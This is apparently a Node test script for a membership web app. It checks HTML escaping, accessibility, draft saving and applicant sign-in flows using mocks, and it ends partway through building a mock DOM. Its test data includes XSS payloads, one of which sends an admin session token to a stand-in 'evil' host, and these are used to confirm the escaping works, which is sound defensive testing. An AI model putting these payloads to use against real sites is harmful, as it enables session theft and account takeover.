import fs from 'node:fs';

const SRC = fs.readFileSync(new URL('../js/app.js', import.meta.url), 'utf8');

// Faithful shim: a browser's textContent -> innerHTML escapes & < > but NOT quotes.
globalThis.document = {
  createElement: () => ({
    _t: '',
    set textContent(v){ this._t = String(v); },
    get textContent(){ return this._t; },
    get innerHTML(){ return this._t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); },
  }),
};

// Pull the three helpers out of the real source rather than re-implementing them.
const grab = (name) => {
  const i = SRC.indexOf(`function ${name}(`);
  let depth = 0, started = false, j = i;
  for (; j < SRC.length; j++) {
    if (SRC[j] === '{') { depth++; started = true; }
    else if (SRC[j] === '}') { depth--; if (started && depth === 0) { j++; break; } }
  }
  return SRC.slice(i, j);
};
const { escapeHtml, escapeAttr, formatDate } = await import(
  'data:text/javascript,' + encodeURIComponent(
    `${grab('escapeHtml')}\n${grab('escapeAttr')}\n${grab('formatDate')}\nexport {escapeHtml, escapeAttr, formatDate};`
  )
);

let pass=0, fail=0;
const ck=(n,c,d='')=>{ c?(pass++,console.log('  PASS  '+n)):(fail++,console.log('  FAIL  '+n+(d?' — '+d:''))); };

console.log('\nSEC-02  Admin-panel XSS payloads are neutralised');
console.log('───────────────────────────────────────────────');

const payloads = [
  `<img src=x onerror="fetch('https://evil/'+localStorage.bcci_admin_session)">`,
  `<script>alert(document.cookie)</script>`,
  `"><svg/onload=alert(1)>`,
  `<iframe src="javascript:alert(1)">`,
  `</td><td><script>x()</script>`,
];
for (const p of payloads) {
  const out = escapeHtml(p);
  ck(`neutralised: ${p.slice(0,40)}…`, !out.includes('<') && !out.includes('>'), out.slice(0,60));
}

console.log('\nAttribute-context escaping');
console.log('──────────────────────────');
ck('escapeAttr closes the double-quote break-out', !escapeAttr('" onerror="alert(1)').includes('"'), escapeAttr('" onerror="alert(1)'));
ck('escapeAttr closes the single-quote break-out', !escapeAttr("' onerror='alert(1)").includes("'"));
ck('plain values survive intact', escapeHtml('Alpha Chem Pvt Ltd') === 'Alpha Chem Pvt Ltd');
ck('ampersands encoded once, not twice', escapeHtml('Shah & Sons') === 'Shah &amp; Sons', escapeHtml('Shah & Sons'));

console.log('\nDefensive value handling');
console.log('────────────────────────');
ck('null renders empty', escapeHtml(null) === '');
ck('undefined renders empty', escapeHtml(undefined) === '');
ck('zero renders "0", not empty (old bug)', escapeHtml(0) === '0', `got "${escapeHtml(0)}"`);
ck('false renders "false"', escapeHtml(false) === 'false');
ck('bad date renders a dash, not "Invalid Date"', formatDate('nonsense') === '—', formatDate('nonsense'));
ck('missing date renders a dash', formatDate(undefined) === '—');
ck('real date formats', /\d/.test(formatDate('2026-08-02T10:00:00Z')));

console.log('\nStatic sweep of the admin render paths');
console.log('──────────────────────────────────────');
const adminBlock = SRC.slice(SRC.indexOf('async renderAdminPortal()'), SRC.indexOf('async handleApproveApplication'));
const rawRecordRefs = [...adminBlock.matchAll(/\$\{\s*(app|enq)\.[A-Za-z]+/g)].map(m=>m[0]);
ck('no raw ${app.*} / ${enq.*} left in the admin tables', rawRecordRefs.length === 0, rawRecordRefs.join(', '));

const inspectBlock = SRC.slice(SRC.indexOf("data-inspect-id]"), SRC.indexOf('_paymentProofHtml(proof)'));
const rawInspect = [...inspectBlock.matchAll(/\$\{\s*app\.[A-Za-z]+/g)].map(m=>m[0]).filter(s=>!s.includes('status'));
ck('no raw ${app.*} left in the inspect modal', rawInspect.length === 0, rawInspect.join(', '));

ck('client no longer calls the email endpoint directly', !SRC.includes('store.sendEmail('));
ck('admin recipient no longer hardcoded client-side', !SRC.includes('CONFIG.ADMIN_EMAIL'));
ck('toast output is escaped', /toast\.innerHTML[\s\S]{0,120}escapeHtml\(message\)/.test(SRC));
ck('FAQ answer id bug fixed', SRC.includes('id="${faqId}"') && !SRC.includes('id="faqId"'));
ck('downloadCardAsImage appends and removes link from document.body', SRC.includes('document.body.appendChild(link)') && SRC.includes('document.body.removeChild(link)'));
ck('card error state uses event listener instead of inline onclick', !SRC.includes('onclick="location.reload()"') && SRC.includes('cardErrorRetryBtn'));
ck('_restoreDraft guards CSS.escape', SRC.includes('typeof CSS') && SRC.includes('CSS.escape'));

console.log('\nMembership CTAs reflect the member\'s actual state');
console.log('─────────────────────────────────────────────────');
const HTML = fs.readFileSync(new URL('../index.html', import.meta.url), 'utf8');
const tagged = (HTML.match(/data-apply-cta/g) || []).length;
ck('every Apply button is tagged for JS to manage', tagged === 3, `found ${tagged}, expected 3 (header, drawer, hero)`);

// No tagged button should be left hardcoded as the only label.
const applyButtons = [...HTML.matchAll(/<button[^>]*data-apply-cta[^>]*>[\s\S]*?<\/button>/g)].map(m => m[0]);
ck('all three say "Apply for Membership" by default', applyButtons.filter(b => /Apply for Membership/.test(b)).length === 3, `${applyButtons.length} found`);

ck('_updateApplyCtas exists', SRC.includes('_updateApplyCtas('));
ck('it is wired into the badge update path', /_updateApplyCtas\(memberApp\)/.test(SRC));
ck('approved members get the CTA hidden', /status === 'Approved'[\s\S]{0,120}display = 'none'/.test(SRC));
ck('pending members get "My Application"', SRC.includes('My Application'));
ck('everyone else keeps "Apply for Membership"', /innerHTML = '<i class="fas fa-building"><\/i> Apply for Membership'/.test(SRC));
ck('the mobile tab flips to My Card when approved', SRC.includes('My Card'));

console.log('\nAccessibility and form resilience');
console.log('─────────────────────────────────');
ck('validation errors are tied to their field', SRC.includes("setAttribute('aria-describedby'") && SRC.includes("setAttribute('aria-invalid'"));
ck('errors are announced as alerts', /errorDiv.setAttribute\('role', 'alert'\)/.test(SRC));
ck('a live region announces view changes', SRC.includes('aria-live') && SRC.includes('page loaded'));
ck('toasts are announced too', /showToast\(message[\s\S]{0,80}this.announce\(message\)/.test(SRC));
ck('modals trap Tab', SRC.includes('_modalKeydown') && SRC.includes("e.key !== 'Tab'"));
ck('modals return focus on close', SRC.includes('_modalReturnFocus'));
ck('reduced motion is honoured in script-driven scrolling', SRC.includes('prefersReducedMotion') && !SRC.includes("behavior: 'smooth'"));

ck('the 18-field form saves a draft', SRC.includes('_saveDraft') && SRC.includes('DRAFT_KEY'));
ck('the draft is restored on return', SRC.includes('_restoreDraft'));
ck('the draft expires', SRC.includes('DRAFT_TTL_MS'));
ck('the draft clears on successful submit', /_clearDraft\(\);[\s\S]{0,120}membershipForm.reset\(\)/.test(SRC));
ck('the payment receipt is excluded from the draft', /type === 'file'/.test(SRC));
ck('restoring a draft is disclosed, not silent', SRC.includes('draftRestoredNotice') && SRC.includes('Start fresh'));
ck('offline is surfaced', SRC.includes('setupConnectivityWatch') && SRC.includes('offlineBanner'));
ck('coming back online does not blanket-enable submit', SRC.includes('Never blanket-enable'));

console.log('\nLoading, error and progress states');
console.log('──────────────────────────────────');
ck('admin panel shows skeletons while fetching', SRC.includes('_showAdminLoading') && SRC.includes('skeleton-bar'));
ck('skeletons appear BEFORE the await', /_showAdminLoading\(\);[\s\S]{0,300}await Promise.all/.test(SRC));
ck('a failed load offers a retry, not a frozen shimmer', SRC.includes('adminRetryBtn'));
ck('the card page has a loading state', SRC.includes('card-skeleton'));
ck('metrics show a placeholder, not a misleading 0', /metricTotal[\s\S]{0,160}textContent = '—'/.test(SRC));

ck('the long form reports progress', SRC.includes('_updateFormProgress') && SRC.includes('required fields complete'));
ck('progress counts the payment receipt too', /type === 'file' \? !!this.currentPaymentProofBase64/.test(SRC));
ck('progress updates on upload and removal', (SRC.match(/_updateFormProgress\(/g) || []).length >= 5);
ck('progress resets after a successful submit', /_updateFormProgress\(membershipForm\)/.test(SRC));

const CSS = fs.readFileSync(new URL('../css/styles.css', import.meta.url), 'utf8');
ck('skeleton shimmer is disabled under reduced motion', /prefers-reduced-motion[\s\S]{0,200}\.skeleton-bar[\s\S]{0,60}animation: none/.test(CSS));
ck('progress bar has a complete state', CSS.includes('.form-progress.is-complete'));
ck('progress bar stacks on narrow screens', /max-width: 560px[\s\S]{0,140}flex-direction: column/.test(CSS));

console.log('\nApplicant Authentication UI (index.html & css)');
console.log('───────────────────────────────────────────────');
ck('#authCardSignIn exists in index.html', /id=["']authCardSignIn["']/.test(HTML));
ck('#applicantEmail exists in index.html', /id=["']applicantEmail["']/.test(HTML));
ck('#applicantPassword has type="password" and autocomplete="current-password"',
  /<input[^>]*id=["']applicantPassword["'][^>]*type=["']password["'][^>]*autocomplete=["']current-password["']|<input[^>]*id=["']applicantPassword["'][^>]*autocomplete=["']current-password["']|<input[^>]*autocomplete=["']current-password["'][^>]*id=["']applicantPassword["']/.test(HTML)
);
ck('#toggleApplicantPassword exists with aria-label="Toggle password visibility"',
  /<button[^>]*id=["']toggleApplicantPassword["'][^>]*aria-label=["']Toggle password visibility["']|<button[^>]*aria-label=["']Toggle password visibility["'][^>]*id=["']toggleApplicantPassword["']/.test(HTML)
);
ck('#applicantSignInBtn exists', /id=["']applicantSignInBtn["']/.test(HTML));
ck('#switchToRegister and #switchToForgot exist', /id=["']switchToRegister["']/.test(HTML) && /id=["']switchToForgot["']/.test(HTML));
ck('#passwordNotSetAlert exists and is initially hidden', /id=["']passwordNotSetAlert["'][^>]*style=["'][^"']*display:\s*none/.test(HTML));

ck('#authCardRegister exists and is initially hidden', /id=["']authCardRegister["'][^>]*style=["'][^"']*display:\s*none/.test(HTML));
ck('#applicantRegEmail and #applicantSendRegOtpBtn exist', /id=["']applicantRegEmail["']/.test(HTML) && /id=["']applicantSendRegOtpBtn["']/.test(HTML));
ck('#applicantRegOtp exists', /id=["']applicantRegOtp["']/.test(HTML));
ck('#applicantRegPassword and confirm have autocomplete="new-password"',
  (/id=["']applicantRegPassword["'][^>]*autocomplete=["']new-password["']|autocomplete=["']new-password["'][^>]*id=["']applicantRegPassword["']/.test(HTML)) &&
  (/id=["']applicantRegPasswordConfirm["'][^>]*autocomplete=["']new-password["']|autocomplete=["']new-password["'][^>]*id=["']applicantRegPasswordConfirm["']/.test(HTML))
);
ck('#applicantRegisterBtn and #switchToSignInFromReg exist', /id=["']applicantRegisterBtn["']/.test(HTML) && /id=["']switchToSignInFromReg["']/.test(HTML));
ck('#applicantResendRegOtpBtn and #applicantRegBackToStep1Btn exist', /id=["']applicantResendRegOtpBtn["']/.test(HTML) && /id=["']applicantRegBackToStep1Btn["']/.test(HTML));

ck('#authCardForgot exists and is initially hidden', /id=["']authCardForgot["'][^>]*style=["'][^"']*display:\s*none/.test(HTML));
ck('#applicantForgotEmail and #applicantSendForgotOtpBtn exist', /id=["']applicantForgotEmail["']/.test(HTML) && /id=["']applicantSendForgotOtpBtn["']/.test(HTML));
ck('#applicantForgotOtp exists', /id=["']applicantForgotOtp["']/.test(HTML));
ck('#applicantNewPassword and confirm have autocomplete="new-password"',
  (/id=["']applicantNewPassword["'][^>]*autocomplete=["']new-password["']|autocomplete=["']new-password["'][^>]*id=["']applicantNewPassword["']/.test(HTML)) &&
  (/id=["']applicantNewPasswordConfirm["'][^>]*autocomplete=["']new-password["']|autocomplete=["']new-password["'][^>]*id=["']applicantNewPasswordConfirm["']/.test(HTML))
);
ck('#applicantResetPasswordBtn and #switchToSignInFromForgot exist', /id=["']applicantResetPasswordBtn["']/.test(HTML) && /id=["']switchToSignInFromForgot["']/.test(HTML));

ck('password input group styles exist in CSS', CSS.includes('.password-input-group') && CSS.includes('.password-toggle-btn'));
ck('auth inline alert styles exist in CSS', CSS.includes('.auth-inline-alert'));


console.log('\nRenewal: card-only, no scheduled job');
console.log('────────────────────────────────────');
import('node:fs').then(() => {});
const exists = (p) => { try { fs.accessSync(new URL(p, import.meta.url)); return true; } catch { return false; } };
ck('the renewal-check endpoint is gone', !exists('../api/renewal-check.js'));
ck('no cron is scheduled in vercel.json', !JSON.parse(fs.readFileSync(new URL('../vercel.json', import.meta.url),'utf8')).crons);
ck('health no longer reports a cron job', !fs.readFileSync(new URL('../api/health.js', import.meta.url),'utf8').includes('cron'));
ck('the reminder email template is gone', !fs.readFileSync(new URL('../api/_lib/email.js', import.meta.url),'utf8').includes('renewal_reminder'));
ck('the VPS scheduler is gone from server.js', !fs.readFileSync(new URL('../server.js', import.meta.url),'utf8').includes('scheduleRenewalCheck'));
ck('no cron dependency was ever added', !Object.keys(JSON.parse(fs.readFileSync(new URL('../package.json', import.meta.url),'utf8')).dependencies).some(d => /cron|schedule|agenda|bree/i.test(d)));

ck('members can still renew themselves', fs.readFileSync(new URL('../api/applications.js', import.meta.url),'utf8').includes("action === 'renew'"));
ck('the card states the date when active', SRC.includes('VALID TILL ${validity.validUntilDate'));
ck('the card states the date when renewal is due', SRC.includes('RENEW BY ${validity.validUntilDate'));
ck('the card states the date when expired', SRC.includes('EXPIRED ${validity.validUntilDate'));

console.log('\nApplicant Authentication Store Methods');
console.log('──────────────────────────────────────');

const { Store } = await import('../js/store.js');

if (typeof globalThis.localStorage === 'undefined') {
  const _storage = new Map();
  globalThis.localStorage = {
    getItem: (k) => _storage.get(k) ?? null,
    setItem: (k, v) => _storage.set(k, String(v)),
    removeItem: (k) => _storage.delete(k),
    clear: () => _storage.clear(),
  };
}

const origFetch = globalThis.fetch;
let lastRequest = null;
let mockResponse = null;

globalThis.fetch = async (url, opts) => {
  lastRequest = { url, ...opts, body: opts?.body ? JSON.parse(opts.body) : null };
  return {
    ok: mockResponse.status >= 200 && mockResponse.status < 300,
    status: mockResponse.status,
    headers: { get: () => 'application/json' },
    async json() { return mockResponse.body; },
    async text() { return JSON.stringify(mockResponse.body); },
  };
};

const store = new Store();

// Test 1: Store has applicant auth methods
ck('store has applicantLogin method', typeof store.applicantLogin === 'function');
ck('store has applicantRegister method', typeof store.applicantRegister === 'function');
ck('store has applicantForgotPasswordRequest method', typeof store.applicantForgotPasswordRequest === 'function');
ck('store has applicantResetPassword method', typeof store.applicantResetPassword === 'function');

// Events store methods
ck('store has getEvents method', typeof store.getEvents === 'function');
ck('store has broadcastEvent method', typeof store.broadcastEvent === 'function');
ck('store has deleteEvent method', typeof store.deleteEvent === 'function');
ck('store has registerForEvent method', typeof store.registerForEvent === 'function');

// Test 2: applicantLogin success
localStorage.clear();
mockResponse = {
  status: 200,
  body: {
    success: true,
    session: { token: 'login-token-123', email: 'user@example.com', expiresIn: 86400 },
  },
};
const loginRes = typeof store.applicantLogin === 'function'
  ? await store.applicantLogin('user@example.com', 'Secret123')
  : null;
ck('applicantLogin sends POST to /api/applicant-auth with action: login',
  lastRequest?.url === '/api/applicant-auth' &&
  lastRequest?.method === 'POST' &&
  lastRequest?.body?.action === 'login' &&
  lastRequest?.body?.email === 'user@example.com' &&
  lastRequest?.body?.password === 'Secret123'
);
ck('applicantLogin returns success and session', loginRes?.success === true && loginRes?.session?.token === 'login-token-123');
ck('applicantLogin persists applicant session in storage', store.getApplicantSession()?.token === 'login-token-123');

// Test 3: applicantLogin with PASSWORD_NOT_SET
localStorage.clear();
mockResponse = {
  status: 400,
  body: {
    success: false,
    code: 'PASSWORD_NOT_SET',
    error: 'No password set for this account yet. Please register or reset password using OTP.',
  },
};
const loginNoPassRes = typeof store.applicantLogin === 'function'
  ? await store.applicantLogin('legacy@example.com', 'Secret123')
  : null;
ck('applicantLogin handles PASSWORD_NOT_SET returning code and error',
  loginNoPassRes?.success === false &&
  loginNoPassRes?.code === 'PASSWORD_NOT_SET' &&
  typeof loginNoPassRes?.error === 'string'
);
ck('applicantLogin on error does not persist session', store.getApplicantSession() === null);

// Test 4: applicantLogin invalid credentials (401)
localStorage.clear();
mockResponse = {
  status: 401,
  body: {
    success: false,
    error: 'Invalid email or password.',
  },
};
const loginInvalidRes = typeof store.applicantLogin === 'function'
  ? await store.applicantLogin('user@example.com', 'WrongPass')
  : null;
ck('applicantLogin handles 401 invalid credentials',
  loginInvalidRes?.success === false && loginInvalidRes?.error === 'Invalid email or password.'
);

// Test 5: applicantRegister success
localStorage.clear();
mockResponse = {
  status: 201,
  body: {
    success: true,
    message: 'Account created successfully.',
    session: { token: 'reg-token-456', email: 'reg@example.com', expiresIn: 86400 },
  },
};
const regRes = typeof store.applicantRegister === 'function'
  ? await store.applicantRegister('reg@example.com', '654321', 'NewPassword123')
  : null;
ck('applicantRegister sends POST to /api/applicant-auth with action: register',
  lastRequest?.url === '/api/applicant-auth' &&
  lastRequest?.method === 'POST' &&
  lastRequest?.body?.action === 'register' &&
  lastRequest?.body?.email === 'reg@example.com' &&
  lastRequest?.body?.code === '654321' &&
  lastRequest?.body?.password === 'NewPassword123'
);
ck('applicantRegister returns success and session', regRes?.success === true && regRes?.session?.token === 'reg-token-456');
ck('applicantRegister persists applicant session in storage', store.getApplicantSession()?.token === 'reg-token-456');

// Test 6: applicantRegister error (invalid OTP)
localStorage.clear();
mockResponse = {
  status: 400,
  body: {
    success: false,
    error: 'Incorrect code. 4 attempts remaining.',
  },
};
const regErrRes = typeof store.applicantRegister === 'function'
  ? await store.applicantRegister('reg@example.com', '000000', 'NewPassword123')
  : null;
ck('applicantRegister handles error gracefully', regErrRes?.success === false && regErrRes?.error === 'Incorrect code. 4 attempts remaining.');
ck('applicantRegister on error does not persist session', store.getApplicantSession() === null);

// Test 7: applicantForgotPasswordRequest success
mockResponse = {
  status: 200,
  body: {
    success: true,
    message: 'Password reset code sent to your email.',
  },
};
const forgotRes = typeof store.applicantForgotPasswordRequest === 'function'
  ? await store.applicantForgotPasswordRequest('reset@example.com')
  : null;
ck('applicantForgotPasswordRequest sends POST to /api/applicant-auth with action: forgot-password-request',
  lastRequest?.url === '/api/applicant-auth' &&
  lastRequest?.method === 'POST' &&
  lastRequest?.body?.action === 'forgot-password-request' &&
  lastRequest?.body?.email === 'reset@example.com'
);
ck('applicantForgotPasswordRequest returns success and message',
  forgotRes?.success === true && forgotRes?.message === 'Password reset code sent to your email.'
);

// Test 8: applicantForgotPasswordRequest rate limited (429)
mockResponse = {
  status: 429,
  body: {
    success: false,
    error: 'Please wait 60s before requesting another reset code.',
  },
};
const forgotLimitRes = typeof store.applicantForgotPasswordRequest === 'function'
  ? await store.applicantForgotPasswordRequest('reset@example.com')
  : null;
ck('applicantForgotPasswordRequest handles rate limit error',
  forgotLimitRes?.success === false && forgotLimitRes?.error === 'Please wait 60s before requesting another reset code.'
);

// Test 9: applicantResetPassword success
localStorage.clear();
mockResponse = {
  status: 200,
  body: {
    success: true,
    message: 'Password reset successful.',
    session: { token: 'reset-token-789', email: 'reset@example.com', expiresIn: 86400 },
  },
};
const resetRes = typeof store.applicantResetPassword === 'function'
  ? await store.applicantResetPassword('reset@example.com', '112233', 'BrandNewPass123')
  : null;
ck('applicantResetPassword sends POST to /api/applicant-auth with action: reset-password',
  lastRequest?.url === '/api/applicant-auth' &&
  lastRequest?.method === 'POST' &&
  lastRequest?.body?.action === 'reset-password' &&
  lastRequest?.body?.email === 'reset@example.com' &&
  lastRequest?.body?.code === '112233' &&
  lastRequest?.body?.newPassword === 'BrandNewPass123'
);
ck('applicantResetPassword returns success and session', resetRes?.success === true && resetRes?.session?.token === 'reset-token-789');
ck('applicantResetPassword persists applicant session in storage', store.getApplicantSession()?.token === 'reset-token-789');

// Test 10: applicantResetPassword error
localStorage.clear();
mockResponse = {
  status: 400,
  body: {
    success: false,
    error: 'That code has expired or was already used. Please request a new one.',
  },
};
const resetErrRes = typeof store.applicantResetPassword === 'function'
  ? await store.applicantResetPassword('reset@example.com', '112233', 'BrandNewPass123')
  : null;
ck('applicantResetPassword handles error gracefully',
  resetErrRes?.success === false && resetErrRes?.error === 'That code has expired or was already used. Please request a new one.'
);
ck('applicantResetPassword on error does not persist session', store.getApplicantSession() === null);

// Restore fetch
globalThis.fetch = origFetch;

console.log('\nTask 5: Client Application Logic & DOM Events');
console.log('─────────────────────────────────────────────');

// 1. Static HTML check: tabindex="-1" removed from .password-toggle-btn
const toggleButtonsWithTabindex = [...HTML.matchAll(/<button[^>]*class=["'][^"']*password-toggle-btn[^"']*["'][^>]*tabindex=["']-1["']|<button[^>]*tabindex=["']-1["'][^>]*class=["'][^"']*password-toggle-btn/g)];
ck('password toggle buttons in index.html do not have tabindex="-1"', toggleButtonsWithTabindex.length === 0, `found ${toggleButtonsWithTabindex.length} with tabindex="-1"`);

// 2. DOM Mock Harness
class MockElement {
  constructor(tag, id = '', className = '') {
    this.tagName = tag.toUpperCase();
    this.id = id;
    this._classes = new Set(className ? className.split(/\s+/).filter(Boolean) : []);
    this.style = {};
    this.attributes = new Map();
    this.children = [];
    this.parentElement = null;
    this.listeners = new Map();
    this.value = '';
    this.type = tag.toLowerCase() === 'input' ? 'text' : '';
    this.disabled = false;
    this._innerHTML = '';
    this._textContent = '';
  }

  get className() { return Array.from(this._classes || []).join(' '); }
  set className(v) { this._classes = new Set(v ? v.split(/\s+/).filter(Boolean) : []); }

  get textContent() { return this._textContent; }
  set textContent(v) {
    this._textContent = String(v);
    this._innerHTML = String(v).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  }

  get innerHTML() { return this._innerHTML; }
  set innerHTML(v) { this._innerHTML = String(v); }

  get classList() {
    return {
      add: (c) => this._classes.add(c),
      remove: (c) => this._classes.delete(c),
      contains: (c) => this._classes.has(c),
      toggle: (c, force) => {
        if (force !== undefined) {
          if (force) this._classes.add(c); else this._classes.delete(c);
          return force;
        }
        if (this._classes.has(c)) { this._classes.delete(c); return false; }
        this._classes.add(c); return true;
      }
    };
  }

  setAttribute(k, v) { this.attributes.set(k, String(v)); }
  getAttribute(k) { return this.attributes.get(k) || null; }
  removeAttribute(k) { this.attributes.delete(k); }
  hasAttribute(k) { return this.attributes.has(k); }

  appendChild(child) {
    child.parentElement = this;
    this.children.push(child);
    return child;
  }

  addEventListener(event, fn) {
    if (!this.listeners.has(event)) this.listeners.set(event, []);
    this.listeners.get(event).push(fn);
  }

  removeEventListener(event, fn) {
    const list = this.listeners.get(event) || [];
    this.listeners.set(event, list.filter(f => f !== fn));
  }

  async dispatchEvent(event) {
    if (!event.target) event.target = this;
    const handlers = this.listeners.get(event.type) || [];
    for (const h of handlers) {
      await h(event);
    }
    if (!event.defaultPrevented && this.parentElement) {
      await this.parentElement.dispatchEvent(event);
    } else if (!event.defaultPrevented && !this.parentElement && globalDocListeners.has(event.type)) {
      for (const h of globalDocListeners.get(event.type)) {
        await h(event);
      }
    }
    return !event.defaultPrevented;
  }

  async click() {
    const event = {
      type: 'click',
      target: this,
      defaultPrevented: false,
      preventDefault() { this.defaultPrevented = true; }
    };
    return await this.dispatchEvent(event);
  }

  async submit() {
    const event = {
      type: 'submit',
      target: this,
      defaultPrevented: false,
      preventDefault() { this.defaultPrevented = true; }
    };
    return await this.dispatchEvent(event);
  }

  focus() {
    this._focused = true;
  }

  closest(selector) {
    let el = this;
    while (el) {
      if (matches(el, selector)) return el;
      el = el.parentElement;
    }
    return null;
  }

  querySelector(selector) {
    for (const child of this.children) {
      if (matches(child, selector)) return child;
      const sub = child.querySelector(selector);
      if (sub) return sub;
    }
    return null;
  }

  querySelectorAll(selector) {
    const results = [];
    for (const child of this.children) {
      if (matches(child, selector)) results.push(child);
      results.push(...child.querySelectorAll(selector));
    }
    return results;
  }
}

function matches(el, selector) {
  if (!el || !selector) return false;
  selector = selector.trim();
  if (selector.startsWith('#')) return el.id === selector.slice(1);
  if (selector.startsWith('.')) return el.classList.contains(selector.slice(1));
  if (selector.includes('[')) {
    const tagMatch = selector.match(/^([a-zA-Z0-9_-]+)?\[([a-zA-Z0-9_-]+)(?:=["']?([^"']+)["']?)?\]/);
    if (tagMatch) {
      const [, tag, attr, val] = tagMatch;
      if (tag && el.tagName !== tag.toUpperCase()) return false;
      if (!el.hasAttribute(attr) && el[attr] === undefined) return false;
      if (val !== undefined) return el.getAttribute(attr) === val || String(el[attr]) === val;
      return true;
    }
  }
  return el.tagName === selector.toUpperCase();
}

const globalDocElements = new Map();
const globalDocListeners = new Map();

function regEl(el) {
  if (el.id) globalDocElements.set(el.id, el);
  for (const c of el.children) regEl(c);
  return el;
}

globalThis.window = {
  location: { pathname: '/', hash: '' },
  history: { pushState: () => {} },
  scrollTo: () => {},
  matchMedia: () => ({ matches: false }),
};

globalThis.document = {
  getElementById: (id) => globalDocElements.get(id) || null,
  querySelector: (sel) => {
    if (sel.startsWith('#')) return globalDocElements.get(sel.slice(1)) || null;
    for (const el of globalDocElements.values()) {
      if (matches(el, sel)) return el;
      const found = el.querySelector(sel);
      if (found) return found;
    }
    return null;
  },
  querySelectorAll: (sel) => {
    const res = [];
    for (const el of globalDocElements.values()) {
      if (matches(el, sel)) res.push(el);
      res.push(...el.querySelectorAll(sel));
    }
    return [...new Set(res)];
  },
  addEventListener: (event, fn) => {
    if (!globalDocListeners.has(event)) globalDocListeners.set(event, []);
    globalDocListeners.get(event).push(fn);
  },
  removeEventListener: (event, fn) => {
    const list = globalDocListeners.get(event) || [];
    globalDocListeners.set(event, list.filter(f => f !== fn));
  },
  createElement: (tag) => new MockElement(tag),
};

// Build the Auth DOM elements
function buildAuthDOM() {
  globalDocElements.clear();
  globalDocListeners.clear();

  const gate = new MockElement('div', 'applicantAuthGate');
  const banner = new MockElement('div', 'applicantAuthBanner');
  banner.style.display = 'none';

  // Segmented mode tabs
  const tabSignIn = new MockElement('button', 'tabAuthSignIn', 'auth-mode-tab active');
  const tabRegister = new MockElement('button', 'tabAuthRegister', 'auth-mode-tab');
  const tabsNav = new MockElement('div', 'authModeTabs', 'auth-mode-tabs');
  tabsNav.appendChild(tabSignIn);
  tabsNav.appendChild(tabRegister);
  gate.appendChild(tabsNav);

  // 1. Sign In Card
  const cardSignIn = new MockElement('div', 'authCardSignIn', 'auth-card');
  const alertNotSet = new MockElement('div', 'passwordNotSetAlert', 'auth-inline-alert');
  alertNotSet.style.display = 'none';
  const legacySwitchBtn = new MockElement('button', 'legacySwitchToRegister', 'auth-text-link');
  alertNotSet.appendChild(legacySwitchBtn);
  cardSignIn.appendChild(alertNotSet);

  const signInForm = new MockElement('form', 'applicantSignInForm');
  const emailIn = new MockElement('input', 'applicantEmail');
  emailIn.type = 'email';
  signInForm.appendChild(emailIn);

  const passGroup = new MockElement('div', '', 'password-input-group');
  const passIn = new MockElement('input', 'applicantPassword');
  passIn.type = 'password';
  const passToggle = new MockElement('button', 'toggleApplicantPassword', 'password-toggle-btn');
  passToggle.setAttribute('aria-label', 'Toggle password visibility');
  const passIcon = new MockElement('i', '', 'fas fa-eye');
  passToggle.appendChild(passIcon);
  passGroup.appendChild(passIn);
  passGroup.appendChild(passToggle);
  signInForm.appendChild(passGroup);

  const forgotLink = new MockElement('button', 'switchToForgot', 'auth-text-link');
  signInForm.appendChild(forgotLink);

  const signInBtn = new MockElement('button', 'applicantSignInBtn', 'btn-primary');
  signInBtn.type = 'submit';
  signInForm.appendChild(signInBtn);

  const regLink = new MockElement('button', 'switchToRegister', 'auth-text-link');
  signInForm.appendChild(regLink);
  cardSignIn.appendChild(signInForm);

  // 2. Register Card
  const cardRegister = new MockElement('div', 'authCardRegister', 'auth-card');
  cardRegister.style.display = 'none';
  const regForm = new MockElement('form', 'applicantRegisterForm');
  const regStep1 = new MockElement('div', 'applicantRegStep1');
  const regEmailIn = new MockElement('input', 'applicantRegEmail');
  regEmailIn.type = 'email';

  const regPassGroup = new MockElement('div', '', 'password-input-group');
  const regPassIn = new MockElement('input', 'applicantRegPassword');
  regPassIn.type = 'password';
  const regPassToggle = new MockElement('button', 'toggleApplicantRegPassword', 'password-toggle-btn');
  regPassToggle.setAttribute('aria-label', 'Toggle password visibility');
  const regPassIcon = new MockElement('i', '', 'fas fa-eye');
  regPassToggle.appendChild(regPassIcon);
  regPassGroup.appendChild(regPassIn);
  regPassGroup.appendChild(regPassToggle);

  const regConfGroup = new MockElement('div', '', 'password-input-group');
  const regConfIn = new MockElement('input', 'applicantRegPasswordConfirm');
  regConfIn.type = 'password';
  const regConfToggle = new MockElement('button', 'toggleApplicantRegPasswordConfirm', 'password-toggle-btn');
  regConfToggle.setAttribute('aria-label', 'Toggle password visibility');
  const regConfIcon = new MockElement('i', '', 'fas fa-eye');
  regConfToggle.appendChild(regConfIcon);
  regConfGroup.appendChild(regConfIn);
  regConfGroup.appendChild(regConfToggle);

  const sendRegOtpBtn = new MockElement('button', 'applicantSendRegOtpBtn', 'btn-primary');

  regStep1.appendChild(regEmailIn);
  regStep1.appendChild(regPassGroup);
  regStep1.appendChild(regConfGroup);
  regStep1.appendChild(sendRegOtpBtn);
  regForm.appendChild(regStep1);

  const regStep2 = new MockElement('div', 'applicantRegStep2');
  regStep2.style.display = 'none';
  const regNotice = new MockElement('div', 'applicantRegNoticeBanner');
  const regOtpIn = new MockElement('input', 'applicantRegOtp');
  const resendRegOtpBtn = new MockElement('button', 'applicantResendRegOtpBtn', 'auth-text-link');
  const regBtn = new MockElement('button', 'applicantRegisterBtn', 'btn-primary');
  regBtn.type = 'submit';
  const regBackToStep1Btn = new MockElement('button', 'applicantRegBackToStep1Btn', 'auth-text-link');

  regStep2.appendChild(regNotice);
  regStep2.appendChild(regOtpIn);
  regStep2.appendChild(resendRegOtpBtn);
  regStep2.appendChild(regBtn);
  regStep2.appendChild(regBackToStep1Btn);
  regForm.appendChild(regStep2);

  const backToSignInFromReg = new MockElement('button', 'switchToSignInFromReg', 'auth-text-link');
  regForm.appendChild(backToSignInFromReg);
  cardRegister.appendChild(regForm);

  // 3. Forgot Card
  const cardForgot = new MockElement('div', 'authCardForgot', 'auth-card');
  cardForgot.style.display = 'none';
  const forgotForm = new MockElement('form', 'applicantForgotForm');
  const forgotStep1 = new MockElement('div', 'applicantForgotStep1');
  const forgotEmailIn = new MockElement('input', 'applicantForgotEmail');
  forgotEmailIn.type = 'email';
  const sendForgotOtpBtn = new MockElement('button', 'applicantSendForgotOtpBtn', 'btn-primary');
  forgotStep1.appendChild(forgotEmailIn);
